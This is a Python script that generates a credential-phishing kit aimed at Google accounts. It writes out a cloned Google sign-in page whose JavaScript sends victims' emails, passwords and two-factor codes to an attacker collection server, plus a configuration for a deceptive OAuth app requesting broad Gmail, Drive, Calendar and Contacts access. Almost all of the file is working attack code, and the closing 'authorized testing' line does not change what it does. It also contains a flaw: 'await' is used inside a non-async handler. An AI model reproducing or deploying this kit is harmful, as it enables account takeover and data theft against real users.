#!/usr/bin/env python3
"""
Google OAuth Phishing Payload
Targets: Google Workspace, Gmail, Google Cloud Platform
Techniques: OAuth token theft, session hijacking, credential harvesting
"""

import os
import json
import random
import string
from datetime import datetime

class GoogleOAuthPhishing:
    def __init__(self):
        self.google_domains = ["google.com", "gmail.com", "googleapis.com"]
        self.oauth_scopes = [
            "https://www.googleapis.com/auth/gmail.readonly",
            "https://www.googleapis.com/auth/gmail.send", 
            "https://www.googleapis.com/auth/drive.readonly",
            "https://www.googleapis.com/auth/calendar.readonly",
            "https://www.googleapis.com/auth/contacts.readonly",
            "https://www.googleapis.com/auth/userinfo.email",
            "https://www.googleapis.com/auth/userinfo.profile"
        ]
    
    def generate_phishing_page(self):
        """Generate Google OAuth phishing page"""
        
        phishing_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Sign in</title>
    <style>
        body {
            font-family: 'Google Sans', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
        }
        .google-logo {
            text-align: center;
            margin-bottom: 16px;
        }
        .google-logo img {
            width: 75px;
            height: 24px;
        }
        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 16px;
            color: #202124;
        }
        .subtitle {
            text-align: center;
            font-size: 16px;
            color: #202124;
            margin-bottom: 24px;
        }
        .form-group {
            margin-bottom: 24px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #1a73e8;
            outline: none;
        }
        .forgot-email {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .info-text {
            font-size: 14px;
            color: #5f6368;
            margin: 32px 0 26px;
        }
        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-button:hover {
            background: #1669d6;
        }
        .footer {
            margin-top: 24px;
            text-align: center;
            font-size: 12px;
            color: #5f6368;
        }
        .language-selector {
            margin-top: 24px;
            text-align: center;
        }
        .language-selector select {
            border: 1px solid #dadce0;
            padding: 8px;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="google-logo">
            <!-- Google logo SVG -->
            <svg width="75" height="24" viewBox="0 0 75 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M69.128 4.267h-3.563v15.36h3.563V4.267z" fill="#4285F4"/>
                <path d="M36.128 4.267c4.787 0 8.533 3.746 8.533 8.533s-3.746 8.533-8.533 8.533-8.533-3.746-8.533-8.533 3.746-8.533 8.533-8.533z" fill="#34A853"/>
                <path d="M57.128 4.267c4.787 0 8.533 3.746 8.533 8.533s-3.746 8.533-8.533 8.533-8.533-3.746-8.533-8.533 3.746-8.533 8.533-8.533z" fill="#FBBC05"/>
                <path d="M14.128 4.267c4.787 0 8.533 3.746 8.533 8.533s-3.746 8.533-8.533 8.533-8.533-3.746-8.533-8.533 3.746-8.533 8.533-8.533z" fill="#EA4335"/>
            </svg>
        </div>
        
        <h1>Sign in</h1>
        <div class="subtitle">Use your Google Account</div>
        
        <form id="loginForm">
            <div class="form-group">
                <input type="email" id="email" name="email" placeholder="Email or phone" required>
            </div>
            
            <div class="form-group" id="passwordGroup" style="display: none;">
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <div class="form-group" style="text-align: left;">
                <a href="#" class="forgot-email">Forgot email?</a>
            </div>
            
            <div class="info-text">
                Not your computer? Use Guest mode to sign in privately.
                <a href="#" style="color: #1a73e8; text-decoration: none;">Learn more</a>
            </div>
            
            <div class="button-group">
                <a href="#" class="create-account">Create account</a>
                <button type="button" id="nextButton" class="next-button">Next</button>
            </div>
        </form>
        
        <div class="footer">
            <select class="language-selector">
                <option>English (United States)</option>
                <option>Español</option>
                <option>Français</option>
            </select>
            <div style="margin-top: 8px;">
                <a href="#" style="color: #5f6368; text-decoration: none; margin: 0 8px;">Help</a>
                <a href="#" style="color: #5f6368; text-decoration: none; margin: 0 8px;">Privacy</a>
                <a href="#" style="color: #5f6368; text-decoration: none; margin: 0 8px;">Terms</a>
            </div>
        </div>
    </div>

    <script>
        // Google OAuth Phishing Script
        document.getElementById('nextButton').addEventListener('click', function() {
            const email = document.getElementById('email').value;
            const passwordGroup = document.getElementById('passwordGroup');
            
            if (!passwordGroup.style.display || passwordGroup.style.display === 'none') {
                // First step: Validate email and show password field
                if (email && email.includes('@')) {
                    // Send email to attacker server
                    fetch('https://malicious-server.com/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            type: 'email_capture',
                            email: email,
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent
                        })
                    });
                    
                    passwordGroup.style.display = 'block';
                    this.textContent = 'Sign in';
                } else {
                    alert('Couldn\\'t find your Google Account');
                }
            } else {
                // Second step: Capture password
                const password = document.getElementById('password').value;
                
                if (password) {
                    // Send credentials to attacker server
                    fetch('https://malicious-server.com/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            type: 'credential_capture',
                            email: email,
                            password: password,
                            timestamp: new Date().toISOString(),
                            ip: await getClientIP()
                        })
                    });
                    
                    // Show fake 2FA page or redirect
                    showTwoFactorPage();
                }
            }
        });
        
        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'unknown';
            }
        }
        
        function showTwoFactorPage() {
            document.body.innerHTML = `
                <div class="login-container">
                    <div class="google-logo">
                        <svg width="75" height="24" viewBox="0 0 75 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <!-- Same Google logo SVG -->
                        </svg>
                    </div>
                    <h1>2-Step Verification</h1>
                    <div class="subtitle">Get a verification code from the Google Authenticator app</div>
                    <div class="form-group">
                        <input type="text" id="verificationCode" placeholder="Enter code" required>
                    </div>
                    <div class="button-group">
                        <button type="button" onclick="submitVerification()" class="next-button">Verify</button>
                    </div>
                </div>
            `;
        }
        
        function submitVerification() {
            const code = document.getElementById('verificationCode').value;
            
            fetch('https://malicious-server.com/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: '2fa_capture',
                    code: code,
                    timestamp: new Date().toISOString()
                })
            });
            
            // Redirect to actual Google or show error
            setTimeout(() => {
                alert('Invalid verification code. Please try again.');
                window.location.href = 'https://accounts.google.com';
            }, 1000);
        }
    </script>
</body>
</html>"""
        
        return phishing_html
    
    def generate_oauth_malicious_app(self):
        """Generate malicious OAuth app configuration"""
        
        app_config = {
            "app_name": "Google Drive Sync Utility",
            "app_description": "Sync your files across devices with Google Drive",
            "developer_email": "support@drivesync-utility.com",
            "privacy_policy_url": "https://drivesync-utility.com/privacy",
            "terms_of_service_url": "https://drivesync-utility.com/terms",
            "redirect_uris": [
                "https://drivesync-utility.com/oauth/callback",
                "https://localhost:8080/oauth/callback"
            ],
            "scopes": self.oauth_scopes,
            "client_id": "".join(random.choices(string.ascii_letters + string.digits, k=32)),
            "client_secret": "".join(random.choices(string.ascii_letters + string.digits, k=16)),
            "authorization_url": "https://accounts.google.com/o/oauth2/v2/auth",
            "token_url": "https://oauth2.googleapis.com/token",
            "malicious_features": {
                "token_theft": True,
                "email_harvesting": True,
                "drive_access": True,
                "calendar_access": True,
                "contacts_access": True
            }
        }
        
        return app_config

if __name__ == "__main__":
    phishing = GoogleOAuthPhishing()
    
    print("Generating Google OAuth phishing payloads...")
    
    # Generate phishing page
    phishing_html = phishing.generate_phishing_page()
    os.makedirs("payloads/organizations/google", exist_ok=True)
    with open("payloads/organizations/google/oauth_phishing.html", 'w') as f:
        f.write(phishing_html)
    print("Created OAuth phishing page")
    
    # Generate malicious app config
    app_config = phishing.generate_oauth_malicious_app()
    with open("payloads/organizations/google/malicious_oauth_app.json", 'w') as f:
        json.dump(app_config, f, indent=2)
    print("Created malicious OAuth app configuration")
    
    print("\nGoogle OAuth phishing payloads generated successfully!")
    print("Use responsibly and only for authorized security testing.")